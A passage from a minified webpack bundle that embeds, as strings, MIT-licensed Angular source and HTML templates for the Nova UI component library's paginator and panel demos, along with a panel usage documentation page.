reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiDocsModule,\n    NuiMessageModule,\n    NuiPaginatorModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    PaginatorAdjacentExampleComponent,\n    PaginatorBasicExampleComponent,\n    PaginatorCustomPageSetExampleComponent,\n    PaginatorExampleComponent,\n    PaginatorHiddenPrevNextExampleComponent,\n    PaginatorStylingExampleComponent,\n    PaginatorVirtualScrollExampleComponent,\n    PaginatorVisibilityExampleComponent,\n    PaginatorVisualTestComponent,\n    PaginatorTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: PaginatorExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "paginator-visual-test",\n        component: PaginatorVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "paginator-test",\n        component: PaginatorTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiPaginatorModule,\n        NuiDocsModule,\n        NuiMessageModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        PaginatorAdjacentExampleComponent,\n        PaginatorBasicExampleComponent,\n        PaginatorCustomPageSetExampleComponent,\n        PaginatorExampleComponent,\n        PaginatorHiddenPrevNextExampleComponent,\n        PaginatorStylingExampleComponent,\n        PaginatorVirtualScrollExampleComponent,\n        PaginatorVisibilityExampleComponent,\n        PaginatorVisualTestComponent,\n        PaginatorTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("paginator"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class PaginatorModule {}\n'},80791:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./panel-basic/panel-basic.example.component";\nexport * from "./panel-collapse/panel-collapse.example.component";\nexport * from "./panel-collapse-outside-control/panel-collapse-outside-control.example.component";\nexport * from "./panel-docs/panel-docs.example.component";\nexport * from "./panel-float/panel-float.example.component";\nexport * from "./panel-hide/panel-hide.example.component";\nexport * from "./panel-hide-outside-control/panel-hide-outside-control.example.component";\nexport * from "./panel-position/panel-position.example.component";\nexport * from "./panel-resize/panel-resize.example.component";\nexport * from "./panel-custom-styles/panel-\u0441ustom-styles.example.component";\nexport * from "./panel-embedded-content/panel-embedded-content.example.component";\nexport * from "./panel-hoverable/panel-hoverable.example.component";\nexport * from "./panel-nested/panel-nested.example.component";\nexport * from "./panel-size/panel-size.example.component";\nexport * from "./panel-collapse-top-oriented/panel-collapse-top-oriented.example.component";\nexport * from "./panel-visual-test/panel-visual-test.component";\nexport * from "./panel-test/panel-test.component";\n'},2885:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-panel id="nui-demo-basic-panel">\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Integer quam nibh, tincidunt non massa quis, efficitur\n                    porttitor lacus. In quis tellus euismod, tincidunt libero\n                    quis, suscipit nunc. Nulla ac mattis tortor, quis iaculis\n                    sapien.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n    </nui-panel>\n</div>\n'},90689:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-panel-basic-example",\n    templateUrl: "./panel-basic.example.component.html",\n})\nexport class PanelBasicExampleComponent {}\n'},3235:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <button\n        [disabled]="isCollapsed"\n        type="button"\n        nui-button\n        (click)="collapse()"\n    >\n        Collapse\n    </button>\n    <button\n        [disabled]="!isCollapsed"\n        type="button"\n        nui-button\n        (click)="expand()"\n    >\n        Expand\n    </button>\n    <nui-panel\n        panelMode="collapsible"\n        id="nui-demo-collapsible-externally-panel"\n        orientation="left"\n        [heading]="heading"\n        [isCollapsed]="isCollapsed"\n        (collapsed)="onCollapseChange($event)"\n    >\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Integer quam nibh, tincidunt non massa quis, efficitur\n                    porttitor lacus. In quis tellus euismod, tincidunt libero\n                    quis, suscipit nunc. Nulla ac mattis tortor, quis iaculis\n                    sapien.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n    </nui-panel>\n</div>\n'},63419:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-panel-collapse-outside-control-example",\n    templateUrl: "./panel-collapse-outside-control.example.component.html",\n})\nexport class PanelCollapseOutsideControlExampleComponent {\n    public isCollapsed: boolean = false;\n    public heading = $localize`Header`;\n\n    public collapse(): void {\n        this.isCollapsed = true;\n    }\n\n    public expand(): void {\n        this.isCollapsed = false;\n    }\n\n    public onCollapseChange($event: boolean): void {\n        this.isCollapsed = $event;\n        this.toastService.info({\n            message: this.isCollapsed\n                ? $localize`Collapsed`\n                : $localize`Expanded`,\n            title: $localize`Panel State`,\n        });\n    }\n\n    constructor(@Inject(ToastService) private toastService: ToastService) {}\n}\n'},91029:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-panel panelMode="collapsible" orientation="top">\n        <div nuiPanelEmbeddedHeading class="d-flex align-items-center">\n            <nui-menu\n                displayStyle="action"\n                [itemsSource]="itemsSource"\n                icon="menu"\n            ></nui-menu>\n            <span class="ml-1">\n                <h4 i18n class="my-0">Path History</h4>\n            </span>\n        </div>\n        <div\n            nuiPanelEmbeddedIcon\n            class="d-flex align-items-center order-2 ml-auto"\n        >\n            <nui-switch [(value)]="isOn">\n                Live {{ isOn ? "On" : "Off" }}\n            </nui-switch>\n        </div>\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Integer eu ex eu augue efficitur luctus quis ac elit. Nam\n                    odio est, iaculis nec varius id, congueerat. Nullam mi\n                    lectus, gravida quis pretium sit amet, accumsan non elit. In\n                    tempus commodo sem ac vulputate. Sed vel sagittis purus.\n                    Integer non ornare felis. Sed aliquam, purus et\n                    euismodtincidunt, felis ligula fermentum mi, eget commodo\n                    nisl orci efficitur dui. Etiam interdum justo magna\n                    consequat, vitae hendrerit mi aliquam.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n    </nui-panel>\n</div>\n'},55569:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, Input } from "@angular/core";\n\nimport { IMenuGroup, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-panel-collapse-top-oriented-example",\n    templateUrl: "./panel-collapse-top-oriented.example.component.html",\n})\nexport class PanelCollapseTopOrientedExampleComponent {\n    @Input() isOn = true;\n\n    constructor(@Inject(ToastService) private toastService: ToastService) {}\n\n    public itemsSource: IMenuGroup[] = [\n        {\n            header: $localize`section title`,\n            itemsSource: [\n                {\n                    title: $localize`Menu Item`,\n                    itemType: "action",\n                    action: this.actionDone.bind(this),\n                },\n                {\n                    title: $localize`Hover me`,\n                    itemType: "action",\n                    action: this.actionDone.bind(this),\n                },\n                { title: $localize`Selected menu item`, isSelected: true },\n                {\n                    title: $localize`Menu item`,\n                    itemType: "switch",\n                    checked: true,\n                },\n                {\n                    title: $localize`Menu disabled item`,\n                    itemType: "switch",\n                    checked: false,\n                    disabled: true,\n                },\n                {\n                    title: $localize`Menu item with checkbox`,\n                    itemType: "option",\n                    disabled: true,\n                },\n                {\n                    title: $localize`Menu item with icon`,\n                    itemType: "action",\n                    icon: "table",\n                },\n                {\n                    title: $localize`Link menu item`,\n                    itemType: "link",\n                    url: "#button",\n                    disabled: true,\n                },\n                {\n                    title: $localize`Export PDF`,\n                    itemType: "link",\n                    icon: "export-pdf",\n                    url: "#button",\n                },\n            ],\n        },\n    ];\n\n    private actionDone(): void {\n        this.toastService.info({\n            message: $localize`Action Done!!`,\n            title: $localize`Menu Action`,\n        });\n    }\n}\n'},39031:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-panel\n        panelMode="collapsible"\n        id="nui-demo-collapsible-panel"\n        orientation="left"\n        [isCollapsed]="true"\n        (collapsed)="onCollapseChange($event)"\n    >\n        <div nuiPanelEmbeddedHeading class="d-flex flex-row align-items-center">\n            <nui-icon\n                *ngIf="!isCollapsed"\n                class="mr-1"\n                [icon]="headerIcon"\n                iconColor="gray"\n            >\n            </nui-icon>\n            <span>\n                <h4 i18n class="my-0">TRANSCLUDED</h4>\n            </span>\n        </div>\n        <div nuiPanelEmbeddedIcon class="mt-1">\n            <nui-icon\n                *ngIf="isCollapsed"\n                [icon]="headerIcon"\n                [counter]="headerIconCounter"\n            >\n            </nui-icon>\n        </div>\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Integer quam nibh, tincidunt non massa quis, efficitur\n                    porttitor lacus. In quis tellus euismod, tincidunt libero\n                    quis, suscipit nunc. Nulla ac mattis tortor, quis iaculis\n                    sapien.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n    </nui-panel>\n</div>\n'},56111:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-panel-collapse-example",\n    templateUrl: "./panel-collapse.example.component.html",\n})\nexport class PanelCollapseExampleComponent {\n    public isCollapsible = true;\n    public isCollapsed = false;\n    public headerIcon = "filter";\n    public headerIconCounter = 7;\n\n    public onCollapseChange($event: boolean): void {\n        this.isCollapsed = $event;\n    }\n}\n'},50005:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-panel\n        id="nui-demo-custom-styles-panel"\n        orientation="left"\n        [darkBorder]="true"\n        [heading]="heading"\n        [headerPadding]="false"\n        [sidePaneBodyPadding]="false"\n        [panelBackgroundColor]="panelColor"\n    >\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Sed vel sagittis purus. Integer non ornare felis. Sed\n                    aliquam, purus et euismod tincidunt, felis ligula fermentum\n                    mi, eget commodo nisl orci efficitur dui. Etiam interdum\n                    justo magna consequat, vitae hendrerit mi aliquam. Sed non\n                    ex eu purus ornare lobortis tempus id est. Aenean dictum at\n                    dui sit amet mollis.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n    </nui-panel>\n</div>\n'},10203:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { PanelBackgroundColor } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-panel-custom-styles-example",\n    templateUrl: "./panel-custom-styles.example.component.html",\n})\nexport class PanelCustomStylesExampleComponent {\n    constructor() {}\n    public panelColor: PanelBackgroundColor =\n        PanelBackgroundColor.colorBgSecondary;\n    public heading = $localize`No Padding Header`;\n}\n'},28115:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiPanelModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To use <code>&lt;nui-panel&gt;</code> wrap the content with an\n    <code>&lt;nui-panel&gt;</code> element. To pass content to the side panel,\n    put the <code>nuiPanelPaneBodyContent</code> attribute on the element\n    containing the side panel content.\n</p>\n<nui-example-wrapper filenamePrefix="panel-basic" exampleTitle="Basic Usage">\n    <nui-panel-basic-example></nui-panel-basic-example>\n</nui-example-wrapper>\n\n<h2>Custom Position</h2>\n<p>\n    <code>&lt;nui-panel&gt;</code> provides four position options for the side\n    pane (\'left\',\'right\', \'top\' and \'bottom\'). By default it is positioned to\n    the left. To position it on the top, pass \'top\' to\n    <code>&lt;nui-panel&gt;</code>\'s <code>orientation</code> input, works\n    similarly for the other directions.\n</p>\n<nui-example-wrapper\n    filenamePrefix="panel-position"\n    exampleTitle="Custom Position"\n>\n    <nui-panel-position-example></nui-panel-position-example>\n</nui-example-wrapper>\n\n<h2>Size Options</h2>\n<p>\n    Use <code>paneSize</code> binding in order to set\n    <code>&lt;nui-panel&gt;</code> size(width or height - depends on panel\n    position), by default panel size is \'250px\', percents also can be used as\n    well as pixels. To define max and min panel sizes, use\n    <code>paneMaxSize</code> and <code>paneMinSize</code> bindings\n    correspondingly. Default min-size value for width is \'150px\', for height -\n    \'40px\', default max-size value is \'90%\'.\n</p>\n<nui-example-wrapper filenamePrefix="panel-size" exampleTitle="Panel Sizes">\n    <nui-panel-size-example></nui-panel-size-example>\n</nui-example-wrapper>\n\n<h2>Embedded Content</h2>\n<p>\n    Additional content can be added inside the\n    <code>&lt;nui-panel&gt;</code> component. To pass header to the side panel,\n    put the <code>nuiPanelEmbeddedHeading</code> attribute on the element\n    containing the side panel header or use <code>heading</code> binding for the\n    simple text header. To pass embedded icon put the\n    <code>nuiPanelEmbeddedIcon</code> attribute on the transcluded element, for\n    the embedded footer <code>nuiPanelEmbeddedIcon</code> attribute must be\n    applied to the element.\n    <nui-message type="info"\n        >Footer can be added only for left and right panel orientations.\n        <code>nuiPanelEmbeddedIcon</code> will be visible in both collapsed and\n        expanded states, while <code>nuiPanelEmbeddedHeading</code> is visible\n        only in expanded state.\n    </nui-message>\n</p>\n<nui-example-wrapper\n    filenamePrefix="panel-embedded-content"\n    exampleTitle="Embedded Content"\n>\n    <nui-panel-embedded-content-example></nui-panel-embedded-content-example>\n</nui-example-wrapper>\n\n<h2>Custom Styles</h2>\n<p>\n    To modify the background color of the side panel, set the\n    <code>panelBackgroundColor</code> input to a value of type\n    <code\n        ><a\n            href="../miscellaneous/enumerations.html#BackgroundColor"\n            target="_blank"\n            >BackgroundColor</a\n        ></code\n    >. The default is <code>BackgroundColor.colorBgLight</code>. To use dark\n    panel border instead of default one, set <code>darkBorder</code> binding to\n    \'true\', by default \'false\' is assigned. Default header padding also can be\n    removed, pass \'false\' value to the <code>headerPadding</code> binding to\n    reach this, by default \'true\' value is assigned. Similarly, side pane body\n    paddings can also be removed by passing \'false\' to the\n    <code>sidePaneBodyPadding</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="panel-custom-styles"\n    exampleTitle="Custom Styles"\n>\n    <nui-panel-custom-styles-example></nui-panel-custom-styles-example>\n</nui-example-wrapper>\n\n<h2>Collapsible Mode</h2>\n<p>\n    To make <code>&lt;nui-panel&gt;</code> collapsible, set the\n    <code>panelMode</code> input to \'collapsible\'. You can set the collapsed\n    state of <code>nui-panel</code> externally by setting the\n    <code>isCollapsed</code> input.\n</p>\n<nui-example-wrapper\n    filenamePrefix="panel-collapse"\n    exampleTitle="Collapsible Panel"\n>\n    <nui-panel-collapse-example></nui-panel-collapse-example>\n</nui-example-wrapper>\n\n<h2>Closable Mode</h2>\n<p>\n    To make <code>&lt;nui-panel&gt;</code> closable(hidden), set the\n    <code>panelMode</code> input to \'closable\'. You can hide or show the panel\n    by setting the <code>isHidden</code> \'boolean\' input.\n</p>\n<nui-example-wrapper filenamePrefix="panel-hide" exampleTitle="Closable Panel">\n    <nui-panel-hide-example></nui-panel-hide-example>\n</nui-example-wrapper>\n\n<h2>Hoverable Mode</h2>\n<p>\n    To make <code>&lt;nui-panel&gt;</code> collapsed/expanded with the mouse\n    hovering, set the <code>panelMode</code> input to \'hoverable\'.\n    <nui-message type="info"\n        >Note, in this case panel can\'t be collapsed or expanded by the\n        click.</nui-message\n    >\n</p>\n<nui-example-wrapper\n    filenamePrefix="panel-hoverable"\n    exampleTitle="Hoverable Panel"\n>\n    <nui-panel-hoverable-example></nui-panel-hoverable-example>\n</nui-example-wrapper>\n\n<h2>Overlapping the Main Content</h2>\n<p>\n    To make main content overlapped by panel, set the\n    <code>displacePrimaryContent</code> input to \'false\', by default \'true\'\n    value is assigned.\n</p>\n<nui-example-wrapper\n    filenamePrefix="panel-float"\n    exampleTitle="Overlapping Main Content"\n>\n    <nui-panel-float-example></nui-panel-float-example>\n</nui-example-wrapper>\n\n<h2>Enabling Resizability</h2>\n<p>\n    To make <code>&lt;nui-panel&gt;</code> resizable, set the\n    <code>isResizable</code> input to \'true\'. The size of panel by default is\n    bordered by corresponding min/max values. To modify this behaviour, boundary\n    values can be set to \'auto\'. To make percentage sized \'top\' panel resizable,\n    absolute height of parent block should be set.\n    <nui-message type="info"\n        >Note, collapsed state panel can\'t be resizable. Resize of\n        bottom-oriented panel is not currently supported.</nui-message\n    >\n</p>\n<nui-example-wrapper\n    filenamePrefix="panel-resize"\n    exampleTitle="Resizable panel"\n>\n    <nui-panel-resize-example></nui-panel-resize-example>\n</nui-example-wrapper>\n\n<h2>Top Oriented Collapsible Mode</h2>\n<p>\n    To make top oriented collapsible 